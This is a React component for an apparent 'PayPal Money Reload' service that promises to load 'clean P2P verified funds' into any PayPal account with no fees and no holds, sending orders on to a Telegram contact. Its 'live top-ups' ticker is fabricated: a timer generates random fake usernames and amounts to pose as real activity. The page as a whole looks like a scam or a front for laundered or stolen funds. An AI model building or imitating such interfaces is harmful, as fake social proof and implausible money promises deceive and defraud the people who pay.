import React, { useState, useEffect } from 'react';
import { 
  DollarSign, 
  Send, 
  ShieldCheck, 
  Zap, 
  Sparkles, 
  CreditCard, 
  Wallet, 
  CheckCircle2, 
  Lock, 
  Mail, 
  BadgeCheck, 
  Info,
  Activity,
  ArrowRight
} from 'lucide-react';
import { soundManager } from '../utils/audio';

interface PayPalReloadBannerProps {
  onOpenTelegram: (msg?: string) => void;
  incrementClicks: () => void;
}

type DepositSource = 'crypto' | 'card' | 'momo' | 'bank';

interface LiveReloadEntry {
  id: string;
  user: string;
  amount: string;
  method: string;
  time: string;
  avatar: string;
  isNew?: boolean;
}

const RELOAD_PRESETS = [50, 100, 250, 500, 1000, 2500, 5000];

// Dynamic username generator pools
const USER_NAMES_POOL = [
  'Mark_E99', 'Sarah_K', 'Kwame_MoMo', 'CryptoWhale_7', 'Elena_Cash', 
  'Liam_USDT', 'Carlos_77', 'Mikael_Pay', 'Sofia_Card', 'Amina_MoMo', 
  'David_Global', 'Fatima_Express', 'Viktor_BTC', 'Jason_Reload', 'Kenji_Tokyo', 
  'Zoe_Fintech', 'Emeka_Pay', 'Nico_Transfer', 'Lucas_Wire', 'Grace_Card', 
  'Rashid_Dinar', 'Tariq_Crypto', 'Hannah_Shop', 'Dmitri_VVIP', 'Amara_Pay', 
  'Oliver_TRC20', 'Siti_Reload', 'Gabriel_Cash', 'Kofi_MoMo', 'Chloe_Deals'
];

const METHODS_POOL = [
  { method: 'USDT TRC20', avatar: '⚡' },
  { method: 'ETH ERC20', avatar: '💎' },
  { method: 'BTC Bitcoin', avatar: '🪙' },
  { method: 'Debit Card', avatar: '💳' },
  { method: 'MTN Mobile Money', avatar: '📱' },
  { method: 'Visa Card', avatar: '💳' },
  { method: 'Telecel Cash', avatar: '📱' },
  { method: 'Bank Wire', avatar: '🏦' },
  { method: 'Mastercard', avatar: '💳' },
];

const AMOUNTS_POOL = [
  '$150.00', '$250.00', '$350.00', '$500.00', '$750.00', 
  '$1,000.00', '$1,200.00', '$1,500.00', '$2,200.00', '$3,500.00', '$4,500.00'
];

const INITIAL_RELOADS: LiveReloadEntry[] = [
  { id: '1', user: 'Mark_E99', amount: '$1,200.00', method: 'USDT TRC20', time: 'Just now', avatar: '⚡' },
  { id: '2', user: 'Sarah_K', amount: '$500.00', method: 'ETH ERC20', time: '12s ago', avatar: '💎' },
  { id: '3', user: 'Kwame_MoMo', amount: '$350.00', method: 'MTN Mobile Money', time: '34s ago', avatar: '📱' },
  { id: '4', user: 'CryptoWhale_7', amount: '$4,500.00', method: 'BTC Bitcoin', time: '55s ago', avatar: '🪙' },
];

export const PayPalReloadBanner: React.FC<PayPalReloadBannerProps> = ({
  onOpenTelegram,
  incrementClicks,
}) => {
  const [reloadAmount, setReloadAmount] = useState<number>(500);
  const [depositSource, setDepositSource] = useState<DepositSource>('crypto');
  const [paypalEmail, setPaypalEmail] = useState<string>('');
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const [liveReloads, setLiveReloads] = useState<LiveReloadEntry[]>(INITIAL_RELOADS);

  // Zero Processing Fee Calculations (100% Direct Balance)
  const processingFeePercent = 0;
  const processingFeeAmount = 0;
  const totalDepositAmount = reloadAmount;

  // Real-time top-ups stream
  useEffect(() => {
    const interval = setInterval(() => {
      const randomUser = USER_NAMES_POOL[Math.floor(Math.random() * USER_NAMES_POOL.length)];
      const randomMethodObj = METHODS_POOL[Math.floor(Math.random() * METHODS_POOL.length)];
      const randomAmount = AMOUNTS_POOL[Math.floor(Math.random() * AMOUNTS_POOL.length)];
      
      const newEntry: LiveReloadEntry = {
        id: String(Date.now()),
        user: randomUser,
        amount: randomAmount,
        method: randomMethodObj.method,
        time: 'Just now',
        avatar: randomMethodObj.avatar,
        isNew: true,
      };

      setLiveReloads((prev) => {
        const updated = prev.slice(0, 3).map((item, idx) => ({
          ...item,
          isNew: false,
          time: idx === 0 ? '4s ago' : idx === 1 ? '18s ago' : '42s ago',
        }));
        return [newEntry, ...updated];
      });
    }, 3200);

    return () => clearInterval(interval);
  }, []);

  const formatUSD = (num: number) => {
    return new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: 'USD',
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
    }).format(num);
  };

  const getSourceLabel = (src: DepositSource) => {
    switch (src) {
      case 'crypto': return 'Crypto (USDT / ETH / BTC)';
      case 'card': return 'Credit / Debit Card (Visa / Mastercard)';
      case 'momo': return 'Mobile Money (MTN MoMo, Telecel, AT)';
      case 'bank': return 'Bank Wire / SEPA Transfer';
    }
  };

  const handleExecuteReload = () => {
    incrementClicks();
    soundManager.playWinFanfare();
    setIsProcessing(true);

    const emailDisplay = paypalEmail.trim() || 'user@paypal.com';
    const reloadReceivable = formatUSD(reloadAmount);

    // Save order details to Adkings database
    try {
      fetch('/api/orders', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          orderType: 'paypal_reload',
          userEmail: emailDisplay,
          amount: reloadAmount,
          feeAmount: 0,
          feePercentage: 0,
          totalPayable: reloadAmount,
          currency: 'USD',
          paymentMethod: depositSource,
          targetDetails: {
            paypalEmail: emailDisplay,
          },
        }),
      }).catch((e) => console.warn('Order logging to Adkings error:', e));
    } catch (e) {
      // Non-blocking
    }

    const message = 
      `💳 PAYPAL MONEY RELOAD & TOP-UP REQUEST:\n` +
      `━━━━━━━━━━━━━━━━━━━━━━\n` +
      `• Target PayPal Account: ${emailDisplay}\n` +
      `• PayPal Balance You Receive: ${reloadReceivable}\n` +
      `• Processing Fee: $0.00 (Zero Fee)\n` +
      `• Total Amount Payable: ${reloadReceivable}\n` +
      `• Funding Method: ${getSourceLabel(depositSource)}\n` +
      `• Holding Policy: 0% 21-Day Hold • 100% Instant Spendable Balance\n` +
      `━━━━━━━━━━━━━━━━━━━━━━\n` +
      `I am ready to proceed with my ${reloadReceivable} PayPal reload order.`;

    setTimeout(() => {
      setIsProcessing(false);
      onOpenTelegram(message);
    }, 400);
  };

  return (
    <div className="relative overflow-hidden rounded-3xl bg-gradient-to-br from-[#001738] via-[#00224d] to-black border-2 border-blue-500/80 p-4 sm:p-6 shadow-[0_0_40px_rgba(0,112,186,0.3)] glow-gold">
      
      {/* Top Live Header & Title Bar */}
      <div className="flex flex-col lg:flex-row items-start lg:items-center justify-between gap-3 border-b border-blue-500/30 pb-3.5 mb-4">
        <div className="space-y-1">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="bg-gradient-to-r from-blue-500 via-sky-400 to-indigo-500 text-white font-black text-xs sm:text-sm px-3 py-1 rounded-full uppercase tracking-wider shadow-[0_0_12px_rgba(0,112,186,0.6)] flex items-center gap-1.5 animate-pulse">
              <CreditCard className="w-4 h-4 inline" /> PayPal Money Reload
            </span>
            <span className="bg-yellow-400 text-black font-black text-[10px] sm:text-xs px-2.5 py-0.5 rounded uppercase tracking-tight shadow-sm">
              100% Clean P2P Verified Funds
            </span>
            <span className="bg-gradient-to-r from-emerald-600 to-teal-600 text-white font-black text-[10px] sm:text-xs px-2.5 py-0.5 rounded uppercase tracking-tight border border-emerald-300 shadow-[0_0_10px_rgba(16,185,129,0.5)]">
              ZERO PROCESSING FEE • 100% INSTANT VALUE
            </span>
          </div>
          <p className="text-xs text-zinc-300 font-medium pt-1 max-w-3xl leading-relaxed">
            Instantly top up and inject clean, verified money into any <strong className="text-white">PayPal Account</strong> with <strong className="text-emerald-400">zero processing fee ($0.00)</strong> — receive the full <strong className="text-emerald-300">{formatUSD(reloadAmount)} clean spendable balance</strong> with zero delay and instant email confirmation.
          </p>
        </div>

        {/* Live Reload Speed & Guarantee Badges */}
        <div className="flex items-center gap-2 bg-black/60 border border-blue-500/40 px-3 py-1.5 rounded-xl text-xs shrink-0 w-full lg:w-auto justify-between lg:justify-start">
          <div className="flex items-center gap-2.5 font-mono text-[11px]">
            <div className="flex items-center gap-1 text-emerald-400 font-bold">
              <Zap className="w-3.5 h-3.5 text-yellow-400" />
              <span>60s Delivery</span>
            </div>
            <span className="text-zinc-600">•</span>
            <div className="flex items-center gap-1 text-sky-300 font-bold">
              <BadgeCheck className="w-3.5 h-3.5 text-blue-400" />
              <span>0% Hold</span>
            </div>
            <span className="text-zinc-600">•</span>
            <div className="flex items-center gap-1 text-yellow-300 font-bold">
              <Lock className="w-3.5 h-3.5 text-yellow-400" />
              <span>Protected</span>
            </div>
          </div>
        </div>
      </div>

      {/* 4-Step PayPal Reload Process Banner */}
      <div className="bg-[#001026] border border-blue-500/40 rounded-2xl p-3 sm:p-4 mb-5 shadow-inner">
        <div className="flex items-center justify-between mb-2">
          <span className="text-xs font-black text-sky-300 uppercase tracking-wider flex items-center gap-1.5">
            <CheckCircle2 className="w-4 h-4 text-emerald-400" />
            PayPal Reload Process:
          </span>
          <span className="text-[11px] font-mono text-emerald-400 font-bold">
            Zero Fee ➔ Receive {formatUSD(reloadAmount)} PayPal Funds
          </span>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2 text-xs">
          <div className="bg-black/60 border border-blue-500/30 rounded-xl p-2.5 flex items-center gap-2.5">
            <div className="w-6 h-6 rounded-full bg-blue-600 text-white font-black text-xs flex items-center justify-center shrink-0 shadow-[0_0_8px_rgba(37,99,235,0.6)]">
              1
            </div>
            <div>
              <span className="text-[10px] text-zinc-400 block font-bold">Step 1</span>
              <span className="text-white font-bold text-xs">Submit Target PayPal Email</span>
            </div>
          </div>

          <div className="bg-black/60 border border-emerald-500/40 rounded-xl p-2.5 flex items-center gap-2.5 bg-emerald-950/20">
            <div className="w-6 h-6 rounded-full bg-emerald-500 text-black font-black text-xs flex items-center justify-center shrink-0 shadow-[0_0_8px_rgba(16,185,129,0.6)]">
              2
            </div>
            <div>
              <span className="text-[10px] text-emerald-300 block font-bold">Step 2: Zero Processing Fee</span>
              <span className="text-white font-bold text-xs">Send Deposit Amount</span>
            </div>
          </div>

          <div className="bg-black/60 border border-blue-500/30 rounded-xl p-2.5 flex items-center gap-2.5">
            <div className="w-6 h-6 rounded-full bg-sky-500 text-black font-black text-xs flex items-center justify-center shrink-0 shadow-[0_0_8px_rgba(14,165,233,0.6)]">
              3
            </div>
            <div>
              <span className="text-[10px] text-zinc-400 block font-bold">Step 3</span>
              <span className="text-white font-bold text-xs">Automated P2P Balance Sent</span>
            </div>
          </div>

          <div className="bg-black/60 border border-emerald-500/40 rounded-xl p-2.5 flex items-center gap-2.5 bg-emerald-950/20">
            <div className="w-6 h-6 rounded-full bg-emerald-500 text-black font-black text-xs flex items-center justify-center shrink-0 shadow-[0_0_8px_rgba(16,185,129,0.6)]">
              4
            </div>
            <div>
              <span className="text-[10px] text-emerald-400 block font-bold">Step 4: Full Balance Received</span>
              <span className="text-emerald-300 font-black text-xs">{formatUSD(reloadAmount)} Spendable Balance</span>
            </div>
          </div>
        </div>
      </div>

      {/* Main Grid: Interactive Reload Calculator & Funding Selector (Left) + Payment Addresses & Invoice (Right) */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-5 items-stretch">
        
        {/* Left Column: Interactive Reload Configuration (6 cols) */}
        <div className="lg:col-span-6 bg-[#00142b]/90 border border-blue-500/40 rounded-2xl p-4 sm:p-5 shadow-inner space-y-4 flex flex-col justify-between">
          <div className="space-y-4">
            
            <div className="flex items-center justify-between border-b border-blue-500/20 pb-2">
              <span className="text-xs font-black text-sky-300 uppercase tracking-wide flex items-center gap-1.5">
                <Sparkles className="w-3.5 h-3.5 text-yellow-400" />
                PayPal Balance Top-Up Calculator
              </span>
              <span className="text-[11px] font-mono text-emerald-400 font-bold flex items-center gap-1">
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                Live Gateway Active
              </span>
            </div>

            {/* Select Deposit Source */}
            <div>
              <label className="text-xs font-bold text-zinc-300 block mb-1.5">
                Select Funding / Deposit Source:
              </label>
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-1.5">
                {[
                  { id: 'crypto', label: 'Crypto (ETH/USDT/BTC)', icon: Wallet },
                  { id: 'card', label: 'Debit / Card', icon: CreditCard },
                  { id: 'momo', label: 'Mobile Money', icon: Zap },
                  { id: 'bank', label: 'Bank Wire', icon: DollarSign },
                ].map((src) => {
                  const Icon = src.icon;
                  return (
                    <button
                      key={src.id}
                      onClick={() => {
                        setDepositSource(src.id as DepositSource);
                        soundManager.playSpinTick();
                      }}
                      className={`py-2 px-2 rounded-xl font-black text-[11px] transition-all flex flex-col items-center justify-center gap-1 border ${
                        depositSource === src.id
                          ? 'bg-gradient-to-r from-blue-500 to-sky-400 text-white border-blue-300 shadow-[0_0_12px_rgba(0,112,186,0.6)] scale-[1.02]'
                          : 'bg-zinc-900/90 text-zinc-400 hover:text-white border-zinc-800'
                      }`}
                    >
                      <Icon className="w-4 h-4" />
                      <span className="text-center leading-tight">{src.label}</span>
                    </button>
                  );
                })}
              </div>
            </div>

            {/* Reload Amount Input & Slider */}
            <div className="bg-black/70 p-3.5 rounded-xl border border-blue-500/30 space-y-2">
              <div className="flex items-center justify-between text-xs font-bold">
                <span className="text-zinc-300">Target Net PayPal Amount:</span>
                <span className="text-yellow-300 font-mono font-black text-base glow-gold">
                  {formatUSD(reloadAmount)}
                </span>
              </div>

              <div className="flex items-center justify-between text-[11px] text-sky-300 font-mono">
                <span>Spendable PayPal Balance: {formatUSD(reloadAmount)}</span>
                <span className="text-zinc-400 text-[10px]">Min: $50 • Max: $5,000</span>
              </div>

              {/* Slider */}
              <input
                type="range"
                min="50"
                max="5000"
                step="25"
                value={reloadAmount}
                onChange={(e) => setReloadAmount(Number(e.target.value))}
                className="w-full h-2 bg-zinc-800 rounded-lg appearance-none cursor-pointer accent-sky-400"
              />

              {/* Quick Presets */}
              <div className="pt-1">
                <span className="text-[10px] text-zinc-400 font-bold block mb-1">Quick Select Presets:</span>
                <div className="grid grid-cols-7 gap-1">
                  {RELOAD_PRESETS.map((amt) => (
                    <button
                      key={amt}
                      onClick={() => {
                        setReloadAmount(amt);
                        soundManager.playSpinTick();
                      }}
                      className={`py-1 rounded-lg text-[10px] font-mono font-bold transition-all ${
                        reloadAmount === amt
                          ? 'bg-sky-400 text-black font-black shadow-sm'
                          : 'bg-zinc-900 text-zinc-400 hover:text-white border border-zinc-800'
                      }`}
                    >
                      ${amt >= 1000 ? `${amt / 1000}k` : amt}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            {/* Zero Processing Fee Guarantee Banner */}
            <div className="bg-gradient-to-r from-emerald-950/40 via-sky-950/30 to-teal-950/40 border border-emerald-500/50 rounded-xl p-3 space-y-2 text-xs shadow-md">
              <div className="flex items-center justify-between font-bold">
                <span className="text-emerald-300 flex items-center gap-1.5 font-black text-xs sm:text-sm">
                  <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                  0% PROCESSING FEE GUARANTEED • 1:1 CLEAN PAYPAL FUNDS
                </span>
                <span className="bg-emerald-400 text-black font-black font-mono text-xs px-2 py-0.5 rounded">
                  0% Fee
                </span>
              </div>
              <p className="text-[11px] text-zinc-300 leading-normal">
                Pay <strong className="text-emerald-300 font-bold">zero processing fees ($0.00)</strong>. 100% of your deposit is credited directly to your PayPal account with clean P2P liquidity, rapid ledger confirmation, and <strong className="text-white">0% 21-day holding penalty</strong>.
              </p>
              <div className="grid grid-cols-2 gap-2 pt-1.5 border-t border-emerald-500/30 text-xs font-mono">
                <div className="bg-black/60 p-1.5 rounded-lg border border-emerald-500/20">
                  <span className="text-zinc-400 block text-[10px]">Processing Fee:</span>
                  <span className="text-emerald-300 font-black text-sm">$0.00 (Zero Fee)</span>
                </div>
                <div className="bg-black/60 p-1.5 rounded-lg border border-emerald-500/20">
                  <span className="text-zinc-400 block text-[10px]">You Receive (PayPal):</span>
                  <span className="text-emerald-400 font-black text-sm">{formatUSD(reloadAmount)}</span>
                </div>
              </div>
            </div>

            {/* Target PayPal Email or Cashtag */}
            <div>
              <label className="text-xs font-bold text-zinc-300 block mb-1 flex items-center justify-between">
                <span>Target PayPal Email / PayPal.me Link:</span>
                <span className="text-[10px] text-zinc-400 font-normal">Optional (or confirm in TG)</span>
              </label>
              <div className="relative">
                <Mail className="w-4 h-4 text-zinc-400 absolute left-3 top-2.5" />
                <input
                  type="text"
                  placeholder="your-email@paypal.com or @paypalname"
                  value={paypalEmail}
                  onChange={(e) => setPaypalEmail(e.target.value)}
                  className="w-full bg-black/80 border border-blue-500/40 rounded-xl pl-9 pr-3 py-2 text-xs font-mono text-white placeholder-zinc-500 focus:outline-none focus:border-sky-400"
                />
              </div>
            </div>

          </div>

          {/* Guarantee Badge Notice */}
          <div className="text-[10px] text-zinc-400 flex items-center gap-1.5 bg-black/40 p-2 rounded-lg border border-blue-500/20 mt-2">
            <Info className="w-3.5 h-3.5 text-sky-400 shrink-0" />
            <span>Funds are transferred via clean merchant/P2P verified channels with 0% 21-day holding penalty.</span>
          </div>

        </div>

        {/* Right Column: Instant Transfer Desk & Order Summary (6 cols) */}
        <div className="lg:col-span-6 bg-gradient-to-b from-[#001c3d] via-zinc-950 to-black border-2 border-blue-500/60 rounded-2xl p-4 sm:p-5 flex flex-col justify-between shadow-xl space-y-4">
          
          <div className="space-y-3.5">
            {/* Header & Status */}
            <div className="flex items-center justify-between border-b border-blue-500/20 pb-2">
              <div className="flex items-center gap-1.5">
                <Zap className="w-4 h-4 text-yellow-400" />
                <span className="text-xs font-black text-sky-300 uppercase tracking-wide">
                  Instant PayPal Transfer Desk
                </span>
              </div>
              <span className="px-2 py-0.5 bg-emerald-950/80 text-emerald-300 border border-emerald-500/40 rounded text-[11px] font-mono font-black">
                0% Fee • Zero Surcharge
              </span>
            </div>

            {/* Instant Transfer Summary Card */}
            <div className="bg-[#001026] border border-blue-500/40 rounded-xl p-3.5 space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-xs font-bold text-zinc-300">Net PayPal Balance Credit:</span>
                <span className="text-emerald-400 font-mono font-black text-base glow-gold">
                  {formatUSD(reloadAmount)}
                </span>
              </div>

              <div className="grid grid-cols-2 gap-2 text-xs font-mono">
                <div className="bg-black/60 p-2 rounded-lg border border-blue-500/20">
                  <span className="text-zinc-400 text-[10px] block">Target Account:</span>
                  <span className="text-white font-bold truncate block text-[11px]">
                    {paypalEmail.trim() || 'Confirm via Telegram'}
                  </span>
                </div>
                <div className="bg-black/60 p-2 rounded-lg border border-blue-500/20">
                  <span className="text-zinc-400 text-[10px] block">Funding Channel:</span>
                  <span className="text-sky-300 font-bold block text-[11px]">
                    {getSourceLabel(depositSource)}
                  </span>
                </div>
                <div className="bg-black/60 p-2 rounded-lg border border-emerald-500/30">
                  <span className="text-zinc-400 text-[10px] block">Processing Fee:</span>
                  <span className="text-emerald-300 font-bold block text-[11px]">
                    $0.00 (Zero Fee)
                  </span>
                </div>
                <div className="bg-black/60 p-2 rounded-lg border border-emerald-500/30">
                  <span className="text-zinc-400 text-[10px] block">Transfer ETA:</span>
                  <span className="text-emerald-400 font-bold block text-[11px]">
                    ~60s Instant Dispatch
                  </span>
                </div>
              </div>
            </div>

            {/* Guaranteed Protections List */}
            <div className="space-y-2 bg-black/50 p-3 rounded-xl border border-blue-500/20 text-xs">
              <div className="flex items-start gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                <p className="text-[11px] text-zinc-300 leading-snug">
                  <strong className="text-white">100% Clean P2P Verified Funds:</strong> Direct merchant-cleared balance injection without 21-day holding penalties.
                </p>
              </div>
              <div className="flex items-start gap-2">
                <ShieldCheck className="w-4 h-4 text-sky-400 shrink-0 mt-0.5" />
                <p className="text-[11px] text-zinc-300 leading-snug">
                  <strong className="text-white">Full Balance Guarantee:</strong> Receive exact 1:1 value of {formatUSD(reloadAmount)} spendable directly in your PayPal wallet.
                </p>
              </div>
              <div className="flex items-start gap-2">
                <Zap className="w-4 h-4 text-yellow-400 shrink-0 mt-0.5" />
                <p className="text-[11px] text-zinc-300 leading-snug">
                  <strong className="text-white">24/7 Priority Concierge:</strong> Instant dispatch execution and status confirmation handled live on Telegram.
                </p>
              </div>
            </div>

          </div>

          {/* Primary Action Button: Execute PayPal Reload via Telegram Concierge */}
          <div className="space-y-2 pt-1">
            <button
              onClick={handleExecuteReload}
              disabled={isProcessing}
              className="w-full py-3.5 bg-gradient-to-r from-yellow-400 via-amber-500 to-yellow-500 hover:from-yellow-300 hover:to-amber-400 text-black font-black text-xs sm:text-sm rounded-xl border border-yellow-200 shadow-[0_0_20px_rgba(234,179,8,0.7)] flex items-center justify-center gap-2 transition-transform hover:scale-[1.02] active:scale-[0.98] pulse-cta cursor-pointer"
            >
              <CreditCard className="w-4 h-4 text-black" />
              <span>
                {isProcessing ? 'Connecting...' : `Receive ${formatUSD(reloadAmount)} PayPal (Zero Processing Fee)`}
              </span>
              <Send className="w-4 h-4 text-black" />
            </button>

            {/* Direct Telegram Support for Custom Enquiries */}
            <button
              onClick={() => {
                incrementClicks();
                soundManager.playCoin();
                onOpenTelegram('Hi @adkingsSupport, I have a question about PayPal Money Reload.');
              }}
              className="w-full py-2 bg-zinc-900/90 hover:bg-zinc-800 text-sky-300 font-bold text-[10px] sm:text-xs rounded-lg border border-blue-500/30 flex items-center justify-center gap-1 transition-colors cursor-pointer"
            >
              <Send className="w-3 h-3 text-sky-400" />
              <span>Contact 24/7 PayPal Reload Desk on Telegram</span>
            </button>
          </div>

        </div>

      </div>

      {/* Live Recent Reloads Ticker Strip */}
      <div className="mt-4 pt-3 border-t border-blue-500/20 flex flex-wrap items-center justify-between gap-2 text-[10px] text-zinc-400">
        <div className="flex items-center gap-2 flex-wrap">
          <span className="text-sky-300 font-black flex items-center gap-1">
            <Activity className="w-3.5 h-3.5 text-emerald-400 animate-pulse" /> Recent Live Top-Ups:
          </span>
          {liveReloads.map((r) => (
            <span 
              key={r.id} 
              className={`flex items-center gap-1 px-2 py-0.5 rounded border text-zinc-300 font-mono text-[10px] transition-all duration-500 ${
                r.isNew 
                  ? 'bg-sky-950/80 border-sky-400 text-white shadow-[0_0_8px_rgba(56,189,248,0.5)] scale-105' 
                  : 'bg-black/60 border-blue-500/20'
              }`}
            >
              <span>{r.avatar}</span>
              <strong className="text-white">{r.user}</strong>
              <span className="text-emerald-400 font-bold">+{r.amount}</span>
              <span className="text-zinc-400 text-[9px]">({r.method})</span>
              <span className="text-[9px] text-sky-400 font-sans ml-0.5">• {r.time}</span>
            </span>
          ))}
        </div>

        <div className="flex items-center gap-3 font-mono text-[10px]">
          <span className="text-zinc-400">Supported Currencies:</span>
          <span className="text-sky-300 font-bold">USD • EUR • GBP • CAD • AUD</span>
        </div>
      </div>

    </div>
  );
};
